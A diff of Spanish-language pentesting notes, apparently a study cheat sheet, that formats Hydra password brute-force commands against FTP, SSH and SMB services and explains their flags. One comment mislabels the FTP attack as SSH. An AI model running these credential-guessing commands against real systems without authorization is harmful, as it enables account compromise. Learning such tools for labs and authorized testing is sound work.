@@ -15,19 +15,32 @@ Es una herramienta de prueba de penetracion que se utiliza para realizar ataques
 
 
 Hydra fuerza bruta FTP
-❯ **hydra -l omar -P /usr/share/wordlists/rockyou.txt \ftp://❮IP❯ -t 15** Haremos un ataque de fuerza bruta al puerto SSH, antes de completar el comando con soble TAB podemos ver la lista de diccionarios
-* l (ele) -> usuario que en este caso es  'omar'
-* L -> Indicas un archivo que disponga de usuarios 
-* P -> Ruta del diccionario o 'archivo que contiene passwds'
-* t -> Lanzar tareas en paralelo al mismo tiempo
+```bash
+❯ hydra -l omar -P /usr/share/wordlists/rockyou.txt ftp://❮IP❯ -t 15 # Haremos un ataque de fuerza bruta al puerto SSH, antes de completar el comando con soble TAB podemos ver la lista de diccionarios
+
+	# l (ele) -> usuario que en este caso es  'omar'
+	# L -> Indicas un archivo que disponga de usuarios 
+	# P -> Ruta del diccionario o 'archivo que contiene passwds'
+	# t -> Lanzar tareas en paralelo al mismo tiempo
+```
 
 Hydra fuerza bruta SSH
-❯ **hydra -l root -P /usr/share/wordlists/rockyou.txt \ssh://❮IP❯ -t 15 -V -s 2222** Haremos un ataque de fuerza bruta al puerto SSH, antes de completar el comando con soble TAB podemos ver la lista de diccionarios
-* ssh -> Puerto al que vamos a atacar 22
-* IP -> Direccion de la maquina victima
-* P -> Ruta del diccionario o 'archivo que contiene passwds'
-* l (ele) -> usuario que en este caso es  'omar'
-* t -> Lanzar tareas en paralelo al mismo tiempo
-* V -> Verbosity
-* s -> Port y es el puerto al que nos queremos conectar 
+```bash
+❯ hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://❮IP❯ -t 15 -V -s 2222 # Haremos un ataque de fuerza bruta al puerto SSH, antes de completar el comando con soble TAB podemos ver la lista de diccionarios
 
+	# ssh -> Puerto al que vamos a atacar 22
+	# IP -> Direccion de la maquina victima
+	# P -> Ruta del diccionario o 'archivo que contiene passwds'
+	# l (ele) -> usuario que en este caso es  'root'
+	# t -> Lanzar tareas en paralelo al mismo tiempo
+	# V -> Verbosity
+	# s -> Port y es el puerto al que nos queremos conectar 
+```
+
+Hydra fuerza bruta SMB
+```bash 
+❯ hydra -L user.list -P password.list smb://<IP>        # Para ver si esos usuarios y passwd son validos en un servidor SMB
+
+	# L = Ruta o archivo que contiene los usuarios
+	# P = Ruta o archivo que contiene las passwd
+```
